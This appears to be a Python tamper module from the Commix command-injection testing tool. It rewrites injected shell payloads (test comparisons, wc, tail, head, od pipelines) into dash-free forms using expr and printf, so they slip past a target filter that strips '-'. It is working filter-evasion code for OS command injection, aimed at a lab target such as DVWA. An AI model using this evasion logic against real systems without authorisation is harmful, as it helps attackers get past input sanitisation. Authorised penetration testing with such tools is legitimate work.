#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import functools
import collections

from src.utils import settings
from src.core.controller import checks

"""
About: Runs 'test's numeric comparisons ('-eq'/'-ne'/'-le'/'-ge'/'-lt'/'-gt') without a '-' of their
       own, for a target that strips a bare '-' outright.
Notes: This tamper script works against target(s) with a POSIX shell. Equality is read as '='/'!=', which agrees with '-eq'/'-ne' exactly for the plain, unpadded decimal integers commix always compares this way - it would not for a value written with a leading zero. Ordering has no dash-free spelling of its own in 'test', so it is read instead from 'expr's own comparison, whose "<="/">="/"<"/">" need no '-' either - quoted, since unquoted they are shell redirections.
       What this reaches is every '-' the results-, boolean-, time- and file-based techniques
       write: the comparisons above, a word's length, a byte's ordinal, and the marker a result is
       read by. The out-of-band technique follows it too, with the curl and interpreter transports
       and the name lookup chain written without one, and the clients that cannot be (wget,
       openssl) left out of the sweep rather than sent to be refused. Not among them are the
       tempfile-based technique's byte reading and the out-of-band name lookups' hex encoding -
       each turns output into the decimals or hex of its bytes through options, spelled with the
       character this script is there to avoid - and a run reaching either is told so.
References: [1] https://github.com/digininja/DVWA/blob/master/vulnerabilities/exec/source/high.php
"""

__tamper__ = "dashlesstest"
"""
Read before the scripts that rewrite what it reads.

What this one matches is the shape a payload builder wrote - a comparison, a count, a byte taken
down a pipe. A script that breaks those shapes up, a quote or a backslash or a letter at a time,
leaves nothing here to recognise, and this one then rewrites none of it while still being reported
as applied: the '-' it was loaded to remove goes out in every payload. Run before them instead, and
what they are handed is already written without one.
"""
__priority__ = settings.PRIORITY.HIGHER

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_eval_incompatible(__tamper__) or checks.tamper_dep_unix_only(__tamper__)

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Written in front of an output 'expr' is handed, so that an output which is one of its own words
# cannot be read as one. Both readings that write it ask for the byte locale beside it: what they
# count and index is bytes, and a build that knows the target's own locale reads a character there
# instead - two bytes of an accented one answering as a single step.
_OPERAND_GUARD = "A"

# The ordering operators, spelled the way 'expr' reads them rather than 'test'.
_ORDER_OPERATORS = {"-le": "<=", "-ge": ">=", "-lt": "<", "-gt": ">"}

"""
What a gap is spelled with in the payload this is handed.

A substitute is written in before this script sees anything - the request puts it there, and by then
every space outside a quoted literal is gone - so a pattern spelled with a space finds none of what
it was built to find, and the script goes on reporting itself as applied while rewriting nothing at
all. What stands for a gap is asked of the run instead. Two spellings come back from that
substitution rather than one: the run's own, and the tab it falls back on where an expansion would
not be read as the gap it stands for.
"""
def _gap():
  return checks.tamper_blank_pattern()

_Shapes = collections.namedtuple("_Shapes", "length ordinal marker ordering equality opened closed")

# Built once per spelling rather than once per run: what stands for a gap is the run's to settle.
@functools.lru_cache(maxsize=None)
def _shapes(gap):
  many = "(?:" + gap + ")*"
  pipe = many + r"\|" + many
  printers = ("(?:printf" + gap + "%s" + gap + "|printf" + gap + "'%s'" + gap +
              "|echo" + gap + "-n" + gap + ")")
  word = r'"(?P<word>[^"]*)"'
  return _Shapes(
    length=re.compile(r"\$\(" + printers + word + pipe + "wc" + gap + r"-c\)"),
    ordinal=re.compile(r"\$\(" + printers + word + pipe + "tail" + gap + r"-c" + gap +
                       r"\+(?P<at>\d+)" + pipe + "head" + gap + r"-c" + gap + "1" + pipe +
                       "od" + gap + r"-A" + gap + "n" + gap + r"-t" + gap + r"u1\)"),
    marker=re.compile(r"(?P<printer>" + printers + r")(?P<marker>\w+)" + pipe + "tail" + gap +
                      r"-c" + gap + r"\+\$\(\(" + gap + r"\((?P<arith>.*?)\)" + gap + r"\?" +
                      gap + "1" + gap + ":" + gap + r"(?P<past>\d+)" + gap + r"\)\)"),
    ordering={operator: re.compile(gap + re.escape(operator) + gap) for operator in _ORDER_OPERATORS},
    equality={operator: re.compile(gap + re.escape(operator) + gap) for operator in ("-eq", "-ne")},
    opened=re.compile(r"\[" + gap),
    closed=re.compile(gap + r"\]"))


"""
A '[ LEFT OP RIGHT ]' ordering test, rewritten around 'expr' instead. Which side holds the plain
integer and which the longer expression is not the same from one caller to the next - a length is
compared against a variable on either side, depending on which payload built the check - so neither
side is assumed to be the simple one. What is assumed is that this bracket is flat: nothing commix
writes for this ever nests a second '[' inside the one being rewritten, so the nearest '[ ' before
the operator and the nearest ' ]' after it are this same test's own boundary, however long either
side runs.
"""
def _rewrite_ordering(payload):
  shapes = _shapes(_gap())
  for operator, symbol in _ORDER_OPERATORS.items():
    search_from = 0
    while True:
      found = shapes.ordering[operator].search(payload, search_from)
      if not found:
        break
      opened = list(shapes.opened.finditer(payload, 0, found.start()))
      closed = shapes.closed.search(payload, found.end())
      if not opened or not closed:
        search_from = found.end()
        continue
      left = payload[opened[-1].end():found.start()]
      right = payload[found.end():closed.start()]
      replacement = "[ $(expr " + left + " '" + symbol + "' " + right + ") = 1 ]"
      payload = payload[:opened[-1].start()] + replacement + payload[closed.end():]
      search_from = opened[-1].start() + len(replacement)
  return payload

"""
The printing a reading is taken through, as either technique writes it.

The same reading is written twice in the tree - once through 'checks.print_value()' and once with
the format spelled out - and with or without spaces around the pipes. Matched both ways here so one
rewrite covers them, rather than one of them being quietly left carrying a '-'.
"""
# How far into a word a reading starts, as the regex 'expr' matches that many characters with.
def _skipped(count):
  return r".\{" + str(count) + r"\}"

"""
The byte count the comparisons are made against, spelled without the '-' of 'wc -c'.

Written down a pipe because the separator being proved is one, and nothing set on its left side
survives to be read with '${#...}' on the right. 'wc' without its option counts the same bytes in
the last of the numbers it prints, and 'expr STRING : REGEX' answers with how far a match ran, which
needs neither a pipe nor a dash of its own.

What is measured here is a command's own output, which a run is free to find anything in - and an
output that is one of 'expr's own words, a '|' or a '(' or 'match' or 'length', is read as that word
rather than as the text being measured: refused outright by one build of it, answered with a wrong
number by another. A letter in front of it can be neither, and the one it adds to the count is taken
off the way the byte ordinal takes off its own span, by adding the rest of a round number and
keeping the remainder - a '-' being the one thing that cannot be written here.
"""
# What the guarded count is carried round by. A thousand million bytes is past any output a run
# reads a byte at a time, and the sum of the two stays inside what a shell counts with.
_LENGTH_SPAN = 1000000000

def _rewrite_length(payload):
  def _rewritten(match):
    counted = ('$(' + settings.BYTE_LOCALE + ' expr "' + _OPERAND_GUARD + match.group("word") +
               '" : \'.*\')')
    return ("$(expr \\( " + counted + " + " + str(_LENGTH_SPAN - 1) + " \\) % " + str(_LENGTH_SPAN) + ")")
  return _shapes(_gap()).length.sub(_rewritten, payload)

"""
The byte read down the pipe, without the '-' of 'tail -c +N', 'head -c 1' and 'od -A n -t u1'.

'expr STRING : REGEX' takes the character the three of them were there to reach, and 'printf' reads
its ordinal the way every other byte in a payload is read. Written as a command substitution rather
than an arithmetic one, because this stands where the caller may already have an arithmetic
expansion open, and one holding another is not parsed alike everywhere. The span is added on and
taken off again for the same reason 'byte_ordinal' does it - a build whose 'printf' signs the byte
answers with a negative, and the same sum lands either answer back in range.

What is taken is the byte and everything behind it, rather than the byte on its own: a substitution
hands back no trailing line break, so a byte that is one came back as nothing at all and was read as
an ordinal of zero - which a command's output holds one of per line. The output's own last byte is
never a line break for the same reason, so what the match ends on is always a byte that survives,
and 'printf' reads the ordinal of the first one either way.

A letter is written in front of the output for the same reason the count beside this one is taken
off a line of 'wc': an output that is one of 'expr's own words is read as that word rather than as
the text being indexed. The byte is counted one further in to go with it.
"""

def _rewrite_piped_ordinal(payload):
  span = str(settings.HIGHEST_BYTE + 1)
  def _rewritten(match):
    character = ('$(' + settings.BYTE_LOCALE + ' expr "' + _OPERAND_GUARD + match.group("word") +
                 '" : "' + _skipped(int(match.group("at"))) + r'\(.*\)")')
    return ("$(expr \\( $(" + settings.BYTE_LOCALE + " printf '%d' \"'" + character +
            "\") + " + span + " \\) % " + span + ")")
  return _shapes(_gap()).ordinal.sub(_rewritten, payload)

"""
The marker printed, or not, without the '-' of 'tail -c +N'.

The pipe form writes the marker out whole and then takes it from the byte the comparison picks -
its first where the answer is yes, one past its last where it is no, which leaves nothing to take.
The same choice is made by how far into the marker 'expr' is told to start: none of it where the
answer is yes, all of it where it is no, and what comes back is handed to the run's own printing
rather than to a second one of this script's.
"""

def _rewrite_printed_marker(payload):
  def _rewritten(match):
    skipped = "$(( (" + match.group("arith") + ") ? 0 : " + str(int(match.group("past")) - 1) + " ))"
    taken = '$(expr "' + match.group("marker") + '" : "' + r".\{" + skipped + r"\}\(.*\)" + '")'
    # What comes back is a word of letters or nothing at all, and neither printing may carry a '-'
    # of its own - which rules out the '-n' a value is printed with where the run prints with
    # 'echo'. The line break 'echo' leaves behind costs nothing: what is read off the page is
    # whether the marker is on it. 'printf' keeps its format, since handed none at all it answers
    # with a usage error instead of the silence an absent marker is supposed to look like.
    printing = "echo" + settings.SINGLE_WHITESPACE if settings.PRINT_WITH_ECHO else checks.print_value("")
    return printing + taken
  return _shapes(_gap()).marker.sub(_rewritten, payload)

# Read every comparison the way 'test' does without its own operators' '-'.
def tamper(payload):
  # A target settled as Windows after this script was accepted: 'cmd.exe' has no 'test' expression to write the dash-free way.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return payload
  payload = _rewrite_ordering(payload)
  payload = _rewrite_length(payload)
  payload = _rewrite_printed_marker(payload)
  payload = _rewrite_piped_ordinal(payload)
  equality = _shapes(_gap()).equality
  for operator, symbol in (("-eq", "="), ("-ne", "!=")):
    payload = equality[operator].sub(settings.SINGLE_WHITESPACE + symbol + settings.SINGLE_WHITESPACE, payload)
  # Written with spaces and left that way: the gap this run spells goes in once, over the whole
  # payload, after every script has had it.
  return payload

# eof
